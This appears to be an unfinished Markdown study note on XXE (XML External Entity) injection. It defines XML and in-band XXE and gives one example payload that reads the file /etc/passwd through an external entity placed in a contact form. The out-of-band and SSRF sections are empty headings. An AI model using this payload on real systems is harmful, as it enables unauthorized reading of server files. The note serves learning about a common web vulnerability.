## XXE Injection - (XML External Entity) injection
security flaw that exploits vulnerabilities in an application's XML input


### XML
XML -  **Extensible Markup Language**  is typically used by applications to store and transport data and is a markup language derived from SGML **Standard Generalized Markup Language**, which is the same standard that HTML is based on


### XXE IN BAND
In-band refers to an vulnerability where the attacker can see the response from the server.

Example:
```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>hacker@hacker.com</email>
<message>hacked</message>
</contact>
```


**XXE OUT OF BAND**




**SSRF + XXE**

